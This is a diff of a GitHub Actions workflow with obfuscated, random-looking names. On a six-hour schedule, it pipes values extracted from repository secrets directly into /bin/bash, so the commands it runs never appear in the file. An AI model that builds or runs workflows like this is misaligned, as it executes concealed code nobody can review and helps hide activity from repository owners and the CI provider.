@@ -2,21 +2,23 @@ name: muhong19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '31 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: muhong19871010
         env:
-          fyap240: ${{ secrets.fyap240 }}
+          kzo9: ${{ secrets.kzo9 }}
         run: |
-          echo $fyap240 | jq -r .kr95 | /bin/bash
-          echo $n3 | jq -r .vobe22566 | /bin/bash
-          echo $uhe27 | jq -r .nit02543 | /bin/bash
-          echo $mptr0680 | jq -r .wa15 | /bin/bash
-          echo $ccncs580 | jq -r .ksyjl9253 | /bin/bash
-          echo $g4880 | jq -r .s619 | /bin/bash
-          echo $osyv48786 | jq -r .eqyse874 | /bin/bash
+          echo $kzo9 | jq -r .zb6 | /bin/bash
+          echo $jbx15 | jq -r .nhlur643 | /bin/bash
+          echo $agx14 | jq -r .xeye0 | /bin/bash
+          echo $ppyyv84823 | jq -r .koovp677 | /bin/bash
+          echo $iuid855 | jq -r .pdjjc9 | /bin/bash
+          echo $vqzfh25 | jq -r .bu14771 | /bin/bash
+          echo $yh15 | jq -r .s976 | /bin/bash
+          echo $nevk33981 | jq -r .pn9 | /bin/bash
 
